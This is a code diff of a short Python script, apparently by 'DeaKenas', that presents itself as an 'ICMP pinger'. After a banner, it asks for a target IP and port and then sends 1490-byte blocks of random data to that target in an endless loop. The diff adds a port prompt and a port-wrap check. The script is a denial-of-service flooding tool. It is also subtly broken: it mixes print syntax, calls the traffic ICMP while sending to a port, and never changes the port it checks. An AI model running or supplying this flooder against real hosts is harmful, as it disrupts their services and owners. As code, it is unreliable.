@@ -21,7 +21,6 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet ICMP P1NGER")
 print
 print("$$$$$$$\   $$\                                       ")
 print("$$  __$$\$$$$ |                                      ")
@@ -35,14 +34,16 @@ print("                         $$\   $$ |                  ")
 print("                         \$$$$$$  |                  ")
 print("                          \______/                   ")
 print("Thanks for using my custom pinger!")
-print"By DeaKenas"
+print("By DeaKenas")
 print
-ip = raw_input("Script Target: ")
+ip = raw_input("Script Target : ")
+ping = input("ICMP Port : ")
 
 os.system("clear")
-os.system("figlet ICMP P1NGER")
 sent = 0
 while True:
-     sock.sendto(bytes, (ip))
+     sock.sendto(bytes, (ip,ping))
      sent = sent + 1
-     print "P1NGED %s packets to %s with ICMP"%(sent,ip)
+     print "P1NGED %s packets to %s : ICMP, Hit port %s"%(sent,ip,ping)
+     if ping == 65534:
+       ping = 1
